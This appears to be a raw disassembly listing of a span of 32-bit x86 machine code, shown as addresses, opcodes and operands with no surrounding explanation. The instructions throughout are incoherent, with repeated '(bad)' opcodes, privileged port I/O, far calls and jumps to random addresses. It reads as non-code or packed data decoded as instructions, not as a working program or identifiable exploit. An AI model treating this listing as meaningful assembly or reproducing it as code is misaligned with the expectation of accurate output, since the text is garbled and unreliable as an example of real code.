  419c88:	cmp    DWORD PTR [ebp+0x6fcfaad9],0x73605b94
  419c92:	inc    eax
  419c93:	data16 or al,0x12
  419c96:	mov    ss,ecx
  419c98:	jbe    0x419c40
  419c9a:	lods   eax,DWORD PTR ds:[esi]
  419c9b:	lds    esp,FWORD PTR [edx]
  419c9d:	push   ss
  419c9e:	xchg   ecx,eax
  419c9f:	stc    
  419ca0:	adc    ah,BYTE PTR [eax+0x3d73bb74]
  419ca6:	dec    esi
  419ca7:	sub    DWORD PTR [esi],edx
  419ca9:	dec    esi
  419caa:	mov    bh,0xa5
  419cac:	mov    ebx,DWORD PTR [eax]
  419cae:	adc    al,0x52
  419cb0:	add    bh,BYTE PTR [ebp-0x25d0c74e]
  419cb6:	stos   DWORD PTR es:[edi],eax
  419cb7:	cmp    al,BYTE PTR [edi]
  419cb9:	arpl   WORD PTR [ebx+edi*1+0x32],cx
  419cbd:	and    ch,bl
  419cbf:	mov    ah,0x66
  419cc1:	mov    eax,0xfffa5321
  419cc6:	mov    al,0x3a
  419cc8:	jno    0x419c96
  419cca:	pop    eax
  419ccb:	jmp    0xdc217d
  419cd0:	in     eax,0xc1
  419cd2:	push   0xbb69f855
  419cd7:	or     al,0x68
  419cd9:	cmc    
  419cda:	pop    ecx
  419cdb:	addr16 cwde 
  419cdd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419cde:	cmp    dl,ch
  419ce0:	mov    ah,BYTE PTR [eax-0x14]
  419ce3:	jmp    0x70d13e0e
  419ce8:	loopne 0x419cec
  419cea:	test   al,0x17
  419cec:	out    0x3d,al
  419cee:	(bad)  
  419cef:	cmp    edx,edx
  419cf1:	adc    BYTE PTR [esp+ebx*4-0x4d],ah
  419cf5:	pop    ss
  419cf6:	imul   eax,DWORD PTR [ecx],0x3a
  419cf9:	icebp  
  419cfa:	mov    cl,0xe1
  419cfc:	imul   edi,DWORD PTR [eax-0x32d2f712],0x5e2051c2
  419d06:	and    edx,DWORD PTR [ebx-0x6709054b]
  419d0c:	fld    DWORD PTR [ebx]
  419d0e:	sti    
  419d0f:	shr    cl,0x4f
  419d12:	mov    ds:0xd29aa907,al
  419d17:	mov    ds:0xb2d58fc7,eax
  419d1c:	jecxz  0x419d89
  419d1e:	sub    eax,0xadf7dd2b
  419d23:	cdq    
  419d24:	cwde   
  419d25:	add    al,0x58
  419d27:	in     eax,dx
  419d28:	shl    DWORD PTR [ecx+edi*8],cl
  419d2b:	pop    edi
  419d2c:	cmp    eax,0xe46bf517
  419d31:	ror    DWORD PTR [eax+eiz*2-0x6b],1
  419d35:	mov    bl,0xdd
  419d37:	aad    0x5d
  419d39:	lock sub DWORD PTR [ebp-0x5c],ebp
  419d3d:	pushf  
  419d3e:	dec    edx
  419d3f:	push   ecx
  419d40:	push   ebp
  419d41:	and    al,BYTE PTR [eax+0x4b3a2a36]
  419d47:	je     0x419db7
  419d49:	stos   BYTE PTR es:[edi],al
  419d4a:	jnp    0x419ceb
  419d4c:	xchg   esi,eax
  419d4d:	mov    fs,WORD PTR [eax]
  419d4f:	pop    eax
  419d50:	les    eax,FWORD PTR [esi-0x31045070]
  419d56:	lds    esp,FWORD PTR [ebx-0x3bc6ccea]
  419d5c:	imul   BYTE PTR [eax]
  419d5e:	jbe    0x419dbc
  419d60:	les    eax,FWORD PTR [eax-0x29]
  419d63:	push   ecx
  419d64:	xchg   esp,edi
  419d66:	icebp  
  419d67:	fcomip st,st(1)
  419d69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419d6a:	jp     0x419dc8
  419d6c:	pop    es
  419d6d:	push   edx
  419d6e:	jnp    0x419d6d
  419d70:	in     al,0x70
  419d72:	sbb    al,0x7e
  419d74:	in     eax,dx
  419d75:	stos   DWORD PTR es:[edi],eax
  419d76:	mov    BYTE PTR [esi-0x29],ah
  419d79:	fwait
  419d7a:	int3   
  419d7b:	lods   eax,DWORD PTR ds:[esi]
  419d7c:	cmp    al,cl
  419d7e:	es dec edx
  419d80:	pop    edx
  419d81:	adc    ecx,edi
  419d83:	(bad)  
  419d84:	mov    ch,0x50
  419d86:	xchg   esp,eax
  419d87:	inc    eax
  419d88:	mov    eax,0x749f8cde
  419d8d:	xchg   cl,cl
  419d8f:	addr16 (bad) 
  419d91:	adc    BYTE PTR [ebx+0x158f30ec],ch
  419d97:	mov    ebx,ss
  419d99:	sbb    eax,0xfe578a4c
  419d9e:	mov    bh,dh
  419da0:	ja     0x419e0e
  419da2:	sbb    bl,0x19
  419da5:	mov    eax,0x22549473
  419daa:	fst    DWORD PTR ds:0x2b998ec8
  419db0:	jp     0x419dc8
  419db2:	or     eax,0xb94f2a38
  419db7:	dec    ebx
  419db8:	sbb    al,0x79
  419dba:	mov    ds:0x1cd1bef4,eax
  419dbf:	outs   dx,BYTE PTR ds:[esi]
  419dc0:	and    al,dh
  419dc2:	ins    BYTE PTR es:[edi],dx
  419dc3:	jmp    0xd9b3:0xf61b9a93
  419dca:	pop    edi
  419dcb:	dec    eax
  419dcc:	or     al,0x56
  419dce:	xor    eax,0xa1597bc4
  419dd3:	js     0x419dc6
  419dd5:	and    bh,BYTE PTR [ecx]
  419dd7:	ror    DWORD PTR [edx+0x3],0x99
  419ddb:	int3   
  419ddc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419ddd:	fstp   QWORD PTR [ebp-0x5dd79dbe]
  419de3:	pop    ecx
  419de4:	add    BYTE PTR [ecx],bh
  419de6:	fwait
  419de7:	jge    0x419ded
  419de9:	mov    edx,ecx
  419deb:	leave  
  419dec:	mov    edx,0x1252984a
  419df1:	jp     0x419e6c
  419df3:	cmp    DWORD PTR [edi-0x2e],0x65
  419df7:	mov    esp,DWORD PTR [esi*8+0x141ff154]
  419dfe:	and    BYTE PTR [edi-0x55],dl
  419e01:	xor    DWORD PTR [esi],ecx
  419e03:	xchg   ebx,eax
  419e04:	mov    ah,0xb6
  419e06:	cmc    
  419e07:	into   
  419e08:	xor    eax,0x3eee278c
  419e0d:	mov    dh,0x5
  419e0f:	dec    edi
  419e10:	pop    esp
  419e11:	and    cl,BYTE PTR [ebx]
  419e13:	mov    eax,ds:0xa13239ec
  419e18:	ret    
  419e19:	outs   dx,DWORD PTR ds:[esi]
  419e1a:	sub    DWORD PTR [ebx+0x723f0bad],esi
  419e20:	or     DWORD PTR [ebx],edi
  419e22:	test   eax,0xa7c4b84a
  419e27:	div    al
  419e29:	mov    al,ds:0x42069b2c
  419e2e:	push   ecx
  419e2f:	ffree  st(3)
  419e31:	out    0x2d,eax
  419e33:	fidivr WORD PTR [eax+0x665257a6]
  419e39:	jg     0x419e2b
  419e3b:	popa   
  419e3c:	outs   dx,BYTE PTR ds:[esi]
  419e3e:	mov    eax,ds:0xcee0e2fb
  419e43:	lahf   
  419e44:	scas   eax,DWORD PTR es:[edi]
  419e45:	mov    DWORD PTR [ebx+0x63],ebp
  419e48:	inc    ecx
  419e49:	pop    ss
  419e4a:	jo     0x419eb1
  419e4c:	fisubr DWORD PTR [ebx-0x76]
  419e4f:	(bad)  
  419e50:	cmp    eax,0x6a7e2f01
  419e55:	cli    
  419e56:	pop    ss
  419e57:	lds    edx,FWORD PTR [esi+0x55d02aab]
  419e5d:	mov    dh,0xf1
  419e5f:	xor    cl,dh
  419e61:	sub    eax,0xe1a9793a
  419e66:	call   0x40f2:0x5bf161f3
  419e6d:	rcl    BYTE PTR ds:0x7f91317,0xe1
  419e74:	jge    0x419ead
  419e76:	cmp    DWORD PTR [ecx+0x5b048ddd],esp
  419e7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e7d:	push   edx
  419e7e:	imul   DWORD PTR [edx+0x79]
  419e81:	mov    edx,0x42dc6aee
  419e86:	out    dx,eax
  419e87:	xor    eax,0x2cf9e9b8
  419e8c:	leave  
  419e8d:	icebp  
  419e8e:	mov    edx,0xa878323d
  419e93:	stc    
  419e94:	xchg   edx,eax
  419e95:	mul    DWORD PTR [edx-0x17]
  419e98:	jns    0x419f00
  419e9a:	shr    DWORD PTR [ebx],1
  419e9c:	sbb    bh,bl
  419e9e:	dec    bp
  419ea0:	mov    ds:0x2c4b8c8a,al
  419ea5:	jmp    0x419e6b
  419ea7:	(bad)  
  419ea8:	in     eax,dx
  419ea9:	jmp    0x419e70
  419eab:	sbb    al,0x7
  419ead:	jb     0x419ea8
  419eaf:	xchg   edi,eax
  419eb0:	and    dl,BYTE PTR [ebx-0x347c780c]
  419eb6:	rcl    BYTE PTR [edx],1
  419eb8:	leave  
  419eb9:	(bad)  
  419eba:	cmc    
  419ebb:	mov    dl,0xf1
  419ebd:	mov    edi,0x6160078
  419ec2:	sti    
  419ec3:	test   eax,0x17e05ca2
  419ec8:	sbb    al,0x7
  419eca:	push   ebp
  419ecb:	mov    ds:0xc7ca6545,al
  419ed0:	inc    ecx
  419ed1:	loopne 0x419f3e
  419ed3:	dec    edx
  419ed4:	or     dl,BYTE PTR ss:[eax]
  419ed7:	clc    
  419ed8:	imul   esi,DWORD PTR [edi],0xffffff9d
  419edb:	add    BYTE PTR [esi],cl
  419edd:	adc    al,0xc6
  419edf:	out    0x34,eax
  419ee1:	add    BYTE PTR [edi-0x27],al
  419ee4:	into   
  419ee5:	sub    eax,0x42
  419ee8:	cs xor al,0xae
  419eeb:	call   0x101c:0xc38881aa
  419ef2:	out    0x32,al
  419ef4:	fstp   DWORD PTR [edi+0x7a]
  419ef7:	sub    DWORD PTR [ebx-0x32],0xffffffda
  419efb:	gs int3 
  419efd:	adc    BYTE PTR [esi-0x53],0xbe
  419f01:	add    al,0xef
  419f03:	out    0x43,eax
  419f05:	pop    ss
  419f06:	add    eax,0xeaf8287d
  419f0b:	imul   ebp,ecx,0xb80c3f53
  419f11:	dec    eax
  419f12:	sub    DWORD PTR [edi+0x749660bf],esp
  419f18:	test   BYTE PTR [esi-0x49],bh
  419f1b:	jl     0x419ef1
  419f1d:	xchg   DWORD PTR [ebx-0x64bd1be7],edi
  419f23:	mov    al,0x32
  419f25:	push   esi
  419f26:	out    dx,al
  419f27:	mov    bl,0xcb
  419f29:	or     BYTE PTR [edx-0x37],dh
  419f2c:	xchg   ebx,eax
  419f2d:	pop    es
  419f2e:	mov    fs,WORD PTR cs:[edx+0x34]
  419f32:	iret   
  419f33:	cld    
  419f34:	les    esi,FWORD PTR [esi+ebp*2-0x25]
  419f38:	adc    BYTE PTR [ebp+0x6f77080a],dh
  419f3e:	popf   
  419f3f:	add    ebp,0xffffffaf
  419f42:	call   0x2c0d:0xe45181c
  419f49:	lods   eax,DWORD PTR ds:[esi]
  419f4a:	and    BYTE PTR [eax+esi*2],0x67
  419f4e:	sti    
  419f4f:	leave  
  419f50:	jnp    0x419f0a
  419f52:	mov    al,ds:0xe4be8935
  419f57:	xor    edi,edi
  419f59:	jp     0x419fb9
  419f5b:	imul   ecx,DWORD PTR [ebp+0x3bf4212f],0xffffffa1
  419f62:	mov    esi,esp
  419f64:	jle    0x419ef3
  419f66:	jo     0x419f5f
  419f68:	xor    BYTE PTR [ebx],al
  419f6a:	cdq    
  419f6b:	mov    bl,0xf7
  419f6d:	rcr    ebx,cl
  419f6f:	sbb    cl,0x2d
  419f72:	aam    0xf5
  419f74:	loope  0x419f62
  419f76:	ret    
  419f77:	addr16 out 0x69,eax
  419f7a:	nop
  419f7b:	cmp    DWORD PTR [esi],edi
  419f7d:	mov    ebp,0xb315d0cf
  419f82:	in     al,dx
  419f83:	and    bl,0x53
  419f86:	dec    ebp
  419f87:	push   es
  419f88:	call   edx
  419f8a:	push   es
  419f8b:	push   ecx
  419f8c:	bound  eax,QWORD PTR [ebx-0x69af3727]
  419f92:	mov    WORD PTR [ebx+0x7d3181a4],gs
  419f98:	out    0xdc,eax
  419f9a:	ins    BYTE PTR es:[edi],dx
  419f9b:	inc    edi
  419f9c:	lods   eax,DWORD PTR ds:[esi]
  419f9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419f9e:	inc    edi
  419f9f:	push   ecx
  419fa0:	dec    edx
  419fa1:	cwde   
  419fa2:	add    al,0x44
  419fa4:	loop   0x419fc7
  419fa6:	aad    0x25
  419fa8:	(bad)  
  419fa9:	(bad)  
  419fab:	mov    esi,0xc37d2058
  419fb0:	ins    BYTE PTR es:[edi],dx
  419fb1:	or     al,0x8a
  419fb3:	std    
  419fb4:	fs das 
  419fb6:	xchg   ecx,eax
  419fb7:	stos   BYTE PTR es:[edi],al
  419fb8:	mov    eax,ds:0x2c62376d
  419fbd:	xlat   BYTE PTR ds:[ebx]
  419fbe:	xchg   esp,eax
  419fbf:	push   ss
  419fc0:	pop    esi
  419fc1:	mov    dh,0xa1
  419fc3:	adc    al,0xa4
  419fc5:	push   ebp
  419fc6:	mov    DWORD PTR [eax+0x65b27450],ebp
  419fcc:	mov    edx,0x9cfa837a
  419fd1:	es in  eax,0xd
  419fd4:	xor    al,0x8
  419fd6:	dec    DWORD PTR [ecx]
  419fd8:	cmp    eax,edi
  419fda:	xor    DWORD PTR [eax-0x30],eax
  419fdd:	(bad)  
  419fde:	sub    ecx,DWORD PTR [edi+edi*8]
  419fe1:	pop    eax
  419fe2:	fst    QWORD PTR [eax]
  419fe4:	push   cs
  419fe5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419fe6:	sbb    DWORD PTR [ecx],ebp
  419fe8:	mov    ebx,0x20b51c67
  419fed:	mov    ebx,0xc5edfcc9
  419ff2:	jo     0x419fb1
  419ff4:	test   al,0xc0
  419ff6:	mov    eax,ds:0x1c9c91b4
  419ffb:	add    eax,0x61846bef
  41a000:	(bad)  
  41a001:	out    dx,al
  41a002:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a003:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a004:	jmp    FWORD PTR [ecx+eiz*8-0x5031d328]
  41a00b:	test   eax,edi
  41a00d:	pop    ss
  41a00e:	dec    edx
  41a00f:	(bad)  
  41a011:	push   ds
  41a012:	adc    esi,0x5
  41a015:	mov    ch,0x8f
  41a017:	js     0x41a020
  41a019:	loope  0x419ff5
  41a01b:	imul   ebp,DWORD PTR [esi+edi*8+0x5b3d2675],0xffffff98
  41a023:	push   0xffffff85
  41a025:	push   ecx
  41a026:	inc    esp
  41a027:	fistp  DWORD PTR [eax+ecx*8+0x5bc2f30b]
  41a02e:	stos   DWORD PTR es:[edi],eax
  41a02f:	push   es
  41a030:	ja     0x41a056
  41a032:	jne    0x41a00a
  41a034:	add    al,0xd1
  41a036:	(bad)
  41a03a:	xchg   esi,eax
  41a03b:	push   ss
  41a03c:	xchg   DWORD PTR [ecx],edi
  41a03e:	int3   
  41a03f:	cmp    cl,dh
  41a041:	test   BYTE PTR [esi+0x161cebda],0x35
  41a048:	inc    edi
  41a049:	xchg   DWORD PTR [eax],eax
  41a04b:	(bad)
  41a050:	call   0x50b8:0xd36d7476
  41a057:	jb     0x41a0a3
  41a059:	enter  0x5329,0x92
  41a05d:	enter  0x90f8,0x91
  41a061:	dec    edx
  41a062:	cmp    al,0xdb
  41a064:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a065:	push   cs
  41a066:	pop    edi
  41a067:	or     esi,DWORD PTR [eax+esi*2+0x227850fe]
  41a06e:	pop    ss
  41a06f:	xchg   ebx,eax
  41a070:	frstor [edi-0xfde9154]
  41a076:	mov    al,0xca
  41a078:	push   ecx
  41a079:	xchg   edx,eax
  41a07a:	pop    es
  41a07b:	fidiv  WORD PTR [eax-0x11]
  41a07e:	xor    BYTE PTR [ecx+0xd08b2dc],al
  41a084:	idiv   DWORD PTR [esi+0x4746f3ee]
  41a08a:	xor    eax,0x2027872d
  41a08f:	xlat   BYTE PTR ds:[ebx]
  41a090:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a091:	sbb    al,0x2c
  41a093:	mov    ds:0xa12213b6,eax
  41a099:	lods   eax,DWORD PTR ds:[esi]
  41a09a:	mov    al,ds:0x73bc3e84
  41a09f:	inc    edx
  41a0a0:	dec    edx
  41a0a1:	jae    0x41a07c
  41a0a3:	or     DWORD PTR [eax+edi*2+0x5616837d],eax
  41a0aa:	push   ss
  41a0ab:	arpl   WORD PTR gs:[ebx+0x28],bp
  41a0af:	push   0xacfab8e4
  41a0b4:	loopne 0x41a0da
  41a0b6:	push   ds
  41a0b7:	push   eax
  41a0b8:	pop    esp
  41a0b9:	ret    0x3003
  41a0bc:	push   edx
  41a0bd:	test   al,0x9b
  41a0bf:	arpl   WORD PTR [eax+0x1e6ad698],bx
  41a0c5:	mov    bh,0xd8
  41a0c7:	out    dx,eax
  41a0c8:	out    0x96,eax
  41a0ca:	ins    DWORD PTR es:[edi],dx
  41a0cb:	inc    ebp
  41a0cc:	xchg   ecx,eax
  41a0cd:	xor    ecx,esp
  41a0cf:	fsubr  DWORD PTR [ebp+eiz*2+0x66a796f4]
  41a0d6:	xchg   ebp,eax
  41a0d7:	mov    al,bh
  41a0d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a0da:	add    al,BYTE PTR [edi+ebx*1+0x57]
  41a0de:	xchg   edi,eax
  41a0df:	data16 gs sbb bh,bh
  41a0e3:	jmp    0x41a08d
  41a0e5:	jmp    0x41a163
  41a0e7:	(bad)  
  41a0e8:	sub    dh,cl
  41a0ea:	mov    esp,0x94d0a74f
  41a0ef:	pop    esi
  41a0f0:	pop    ebp
  41a0f1:	jnp    0x41a152
  41a0f3:	shr    BYTE PTR [ebx-0x1f4129c2],1
  41a0f9:	jno    0x41a0da
  41a0fb:	xor    al,0x61
  41a0fd:	inc    edx
  41a0fe:	push   0xfffffff4
  41a100:	getsec 
  41a102:	inc    ebx
  41a103:	pop    eax
  41a104:	mov    ecx,edi
  41a106:	cmp    ebx,esp
  41a108:	sahf   
  41a109:	jp     0x41a0bd
  41a10b:	xor    ebp,edi
  41a10d:	inc    ecx
  41a10e:	cmp    ecx,DWORD PTR [esi+0x680c40f5]
  41a114:	fs inc ecx
  41a116:	ja     0x41a174
  41a118:	into   
  41a119:	push   es
  41a11a:	adc    dl,dh
  41a11c:	js     0x41a0f6
  41a11e:	inc    eax
  41a11f:	dec    ecx
  41a120:	hlt    
  41a121:	pop    ds
  41a122:	xchg   edi,eax
  41a123:	out    0x8c,eax
  41a125:	or     BYTE PTR [edx+0x43fcf2a7],0xe5
  41a12c:	cdq    
  41a12d:	sub    ecx,DWORD PTR [edi-0x9]
  41a130:	pop    esp
  41a131:	inc    ebp
  41a132:	rcl    BYTE PTR [edi],1
  41a134:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a135:	pop    esp
  41a136:	xchg   edi,eax
  41a137:	fdiv   DWORD PTR [edx+0x7ba51166]
  41a13d:	ins    BYTE PTR es:[edi],dx
  41a13e:	inc    ebp
  41a13f:	mov    bh,BYTE PTR [edx+edx*1]
  41a142:	or     bh,0x3b
  41a145:	cmp    BYTE PTR [esi+eax*4-0x305dd009],bl
  41a14c:	dec    edi
  41a14d:	dec    esp
  41a14e:	loope  0x41a12f
  41a150:	retf   
  41a151:	sbb    dl,BYTE PTR [edi-0x7a0d44c5]
  41a157:	jbe    0x41a155
  41a159:	mov    ds,esp
  41a15b:	cdq    
  41a15c:	pop    ss
  41a15d:	xor    eax,0xe868748d
  41a162:	(bad)  
  41a163:	pop    esp
  41a164:	mov    al,ds:0x99242fc6
  41a169:	xchg   BYTE PTR [ecx-0x18dd6ae2],al
  41a16f:	pushf  
  41a170:	into   
  41a171:	popf   
  41a172:	mov    dh,0xa0
  41a174:	inc    ecx
  41a175:	aam    0x5c
  41a177:	mov    al,ah
  41a179:	ins    BYTE PTR es:[edi],dx
  41a17a:	mov    dh,0x15
  41a17c:	push   cs
  41a17d:	pop    ebp
  41a17e:	test   BYTE PTR [ebx-0x73b25ccb],cl
  41a184:	pop    es
  41a185:	pop    ecx
  41a186:	sbb    DWORD PTR [ebp+0x60],0x8ddd26e9
  41a18d:	stos   BYTE PTR es:[edi],al
  41a18e:	out    0x21,eax
  41a190:	call   0x2053:0x3fd49fe7
  41a197:	push   ecx
  41a198:	sar    DWORD PTR [ebp-0x18069e6c],1
  41a19e:	push   esp
  41a19f:	repz cmc 
  41a1a1:	xchg   esp,edi
  41a1a3:	loopne 0x41a187
  41a1a5:	sub    al,0xfe
  41a1a7:	pop    ecx
  41a1a8:	sbb    esi,DWORD PTR [ebx-0x2d]
  41a1ab:	(bad)  
  41a1ac:	retf   
  41a1ad:	stc    
  41a1ae:	leave  
  41a1af:	hlt    
  41a1b0:	outs   dx,DWORD PTR ds:[esi]
  41a1b1:	icebp  
  41a1b2:	jno    0x41a1d3
  41a1b4:	and    DWORD PTR [edi+0x4],edx
  41a1b7:	push   edx
  41a1b8:	ds lahf 
  41a1ba:	sub    DWORD PTR [ecx-0x1a],0xba0d1aa2
  41a1c1:	push   edi
  41a1c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a1c3:	dec    edi
  41a1c4:	jmp    0x41a1d4
  41a1c6:	fistp  WORD PTR [eax]
  41a1c8:	pop    ecx
  41a1c9:	inc    eax
  41a1ca:	outs   dx,BYTE PTR ds:[esi]
  41a1cb:	jnp    0x41a1ec
  41a1cd:	sub    dl,BYTE PTR [eax-0x15]
  41a1d0:	cwde   
  41a1d1:	xchg   esp,eax
  41a1d2:	out    dx,eax
  41a1d3:	scas   eax,DWORD PTR es:[edi]
  41a1d4:	mov    ds:0x498d80cb,al
  41a1d9:	out    0xdd,al
  41a1db:	imul   BYTE PTR [ecx-0x78949b76]
  41a1e1:	push   esi
  41a1e2:	jge    0x41a16b
  41a1e4:	jp     0x41a235
  41a1e6:	cmp    DWORD PTR [ebx+0x7a8fd9ca],0xeba0d1b3
  41a1f0:	mov    ecx,0x299decea
  41a1f5:	fadd   st,st(0)
  41a1f7:	scas   al,BYTE PTR es:[edi]
  41a1f8:	mov    ds:0x3467c0ed,eax
  41a1fd:	pop    ecx
  41a1fe:	jo     0x41a21a
  41a200:	sbb    ecx,DWORD PTR [ebx-0x268f99cf]
  41a206:	xor    DWORD PTR [edi+0x3c],0x9
  41a20a:	mov    bl,0xfe
  41a20c:	xor    eax,0x5a50f8ca
  41a211:	mov    ch,0x48
  41a213:	sub    BYTE PTR [edi+ebx*2+0xe],ah
  41a217:	jno    0x41a289
  41a219:	jmp    0x1ea692e5
  41a21e:	or     eax,0xddd9b549
  41a223:	pushf  
  41a224:	or     eax,0x34d2f0a5
  41a229:	dec    ecx
  41a22a:	jmp    0x6b355b61
  41a22f:	jo     0x41a2ae
  41a231:	sub    ebx,DWORD PTR ds:0x5cfa9e3b
  41a237:	adc    esi,DWORD PTR [ecx-0x2f6eb9c]
  41a23d:	popf   
  41a23e:	pop    ebx
  41a23f:	dec    eax
  41a240:	jge    0x41a1f9
  41a242:	mov    esi,0xc180117c
  41a247:	pop    ds
  41a248:	xchg   ebp,eax
  41a249:	push   ds
  41a24a:	sbb    ebx,DWORD PTR [eax+0xc4b6640]
  41a250:	xchg   edx,eax
  41a251:	xor    DWORD PTR [edx-0x36501f03],ecx
  41a257:	and    ah,BYTE PTR [edi-0x2301ff8e]
  41a25d:	in     al,dx
  41a25e:	inc    esp
  41a25f:	out    dx,al
  41a260:	pop    ebx
  41a261:	xchg   DWORD PTR [edi+0x4f],edi
  41a264:	es inc eax
  41a266:	call   0x515c:0x1a8d31df
  41a26d:	lea    edi,[esi]
  41a26f:	jmp    0x41a2c6
  41a271:	xchg   ebp,eax
  41a272:	pop    ebp
  41a273:	and    DWORD PTR [edi+0x67],esp
  41a276:	jge    0x41a237
  41a278:	aas    
  41a279:	add    sp,WORD PTR [edx]
  41a27c:	(bad)  
  41a27d:	lods   eax,DWORD PTR ds:[esi]
  41a27e:	retf   0x44b1
  41a281:	ret    0xdb9b
  41a284:	or     edi,DWORD PTR [ecx-0xd987334]
  41a28a:	push   cs
  41a28b:	outs   dx,BYTE PTR ds:[esi]
  41a28c:	sar    DWORD PTR ds:0x2f14c712,1
  41a292:	gs nop
  41a294:	push   eax
  41a295:	sbb    eax,0x6a3fbb66
  41a29a:	fisub  DWORD PTR [ebx-0x19]
  41a29d:	add    BYTE PTR [esi+0x20ed6f7f],ah
  41a2a3:	out    dx,eax
  41a2a4:	jbe    0x41a24a
  41a2a6:	xchg   DWORD PTR [esi-0x6e183d23],ebx
  41a2ac:	(bad)  
  41a2ad:	sbb    eax,0xed338e23
  41a2b2:	cdq    
  41a2b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a2b4:	jg     0x41a2f3
  41a2b6:	xlat   BYTE PTR ds:[ebx]
  41a2b7:	cwde   
  41a2b8:	xor    bh,BYTE PTR [ecx-0x66]
  41a2bb:	adc    edx,DWORD PTR [eax-0xe]
  41a2be:	ret    0xfc5f
  41a2c1:	inc    ebx
  41a2c2:	repz test eax,0xd12ff698
  41a2c8:	imul   edx,edi,0x49333f1c
  41a2ce:	push   DWORD PTR [ebx-0x80]
  41a2d1:	ret    
  41a2d2:	test   eax,0x59880b58
  41a2d7:	pop    ss
  41a2d8:	std    
  41a2d9:	pushf  
  41a2da:	adc    esi,DWORD PTR [eax-0x78f6c802]
  41a2e0:	arpl   WORD PTR ds:0x5e8049ab,ax
  41a2e6:	leave  
  41a2e7:	xor    DWORD PTR [esi-0x5f],0x65
  41a2eb:	mov    dl,0x3
  41a2ed:	cmp    al,0x7d
  41a2ef:	dec    edi
  41a2f0:	fwait
  41a2f1:	(bad)  
  41a2f2:	lock inc dl
  41a2f5:	call   FWORD PTR [edi+0x137babf5]
  41a2fb:	dec    esp
  41a2fc:	adc    al,0x7f
  41a2fe:	dec    edi
  41a2ff:	adc    esi,eax
  41a301:	push   ebx
  41a302:	in     al,0x6e
  41a304:	int    0x98
  41a306:	icebp  
  41a307:	add    eax,0xa69dabb3
  41a30c:	(bad)  
  41a30d:	push   0x2e20f2d9
  41a312:	sbb    eax,0x834c9621
  41a317:	mov    dh,0xcb
  41a319:	push   eax
  41a31a:	fld    DWORD PTR [ebx]
  41a31c:	mov    bl,bl
  41a31e:	lods   eax,DWORD PTR ds:[esi]
  41a31f:	sbb    al,0x91
  41a321:	jae    0x41a386
  41a323:	jmp    0x930f3e12
  41a328:	cli    
  41a329:	out    dx,al
  41a32a:	mov    ds:0xcfed8a64,al
  41a32f:	cmp    al,dl
  41a331:	outs   dx,BYTE PTR ds:[esi]
  41a332:	out    dx,eax
  41a333:	inc    eax
  41a334:	call   FWORD PTR [edx]
  41a336:	(bad)  
  41a337:	mov    eax,ds:0x31704f53
  41a33c:	aam    0xc1
  41a33e:	push   ds
  41a33f:	sub    eax,0xcc07145b
  41a344:	mov    ds:0xecc1534c,eax
  41a349:	sbb    esi,DWORD PTR [ebx]
  41a34b:	cmp    eax,0x22c68d34
  41a350:	shl    ebx,cl
  41a352:	inc    edi
  41a353:	cmp    al,0x1d
  41a355:	inc    edi
  41a356:	add    DWORD PTR [edi+0x68],0xffffffca
  41a35a:	pusha  
  41a35b:	shrd   esp,esi,cl
  41a35e:	stos   DWORD PTR es:[edi],eax
  41a35f:	xchg   esi,eax
  41a360:	cmp    ch,BYTE PTR [edx+eiz*2]
  41a363:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  41a365:	dec    ebx
  41a366:	mul    DWORD PTR [esi+ebp*1+0x7e]
  41a36a:	mov    al,ds:0xd7d35ae6
  41a36f:	add    eax,0x972499a8
  41a374:	xor    ebx,DWORD PTR [ebp-0x28]
  41a377:	jo     0x41a352
  41a379:	fistp  WORD PTR [esi+esi*4+0x51]
  41a37d:	in     eax,dx
  41a37e:	outs   dx,BYTE PTR ds:[esi]
  41a37f:	fbld   TBYTE PTR [ecx]
  41a381:	(bad)  
  41a382:	retf   0x503a
  41a385:	push   edi
  41a386:	mov    edi,0xb201a7b9
  41a38b:	push   edi
  41a38c:	in     al,dx
  41a38d:	test   eax,0x96bacddd
  41a392:	cmp    DWORD PTR [edi],ebx
  41a394:	outs   dx,DWORD PTR ds:[esi]
  41a395:	and    al,0x28
  41a397:	jno    0x41a32a
  41a399:	(bad)  
  41a39a:	jecxz  0x41a332
  41a39c:	sbb    al,0x52
  41a39e:	mov    ds:0x161d1387,eax
  41a3a3:	lds    esp,FWORD PTR [ebx+0x5aad04e8]
  41a3a9:	out    0x15,al
  41a3ab:	loop   0x41a3e5
  41a3ad:	lods   eax,DWORD PTR ds:[esi]
  41a3ae:	inc    edx
  41a3af:	ror    edi,cl
  41a3b1:	sub    BYTE PTR [esi+0x7f1adb85],al
  41a3b7:	inc    esp
  41a3b8:	popf   
  41a3b9:	call   0x8eca:0x8d099321
  41a3c0:	mov    esp,0x66dcbf4d
  41a3c5:	mov    edi,0x84535fda
  41a3ca:	fist   WORD PTR [ebp+0x54e62156]
  41a3d0:	xchg   esp,eax
  41a3d1:	push   DWORD PTR [ecx-0x12da4262]
  41a3d7:	and    BYTE PTR [ecx],ah
  41a3d9:	push   esi
  41a3da:	xchg   esi,eax
  41a3db:	loopne 0x41a36f
  41a3dd:	xchg   ebx,eax
  41a3de:	push   es
  41a3df:	mov    ebp,esp
  41a3e1:	(bad)  
  41a3e2:	cmp    DWORD PTR [ebp-0x79],eax
  41a3e5:	mov    bh,0x56
  41a3e7:	stos   DWORD PTR es:[edi],eax
  41a3e8:	inc    ebx
  41a3e9:	rol    ebx,0x9a
  41a3ec:	loop   0x41a36f
  41a3ee:	mov    bh,0xaf
  41a3f0:	cld    
  41a3f1:	fwait
  41a3f2:	push   ecx
  41a3f3:	mov    ecx,0x77a675e
  41a3f8:	push   edi
  41a3f9:	mov    ch,0x9
  41a3fb:	fstp   QWORD PTR [ebx+esi*8]
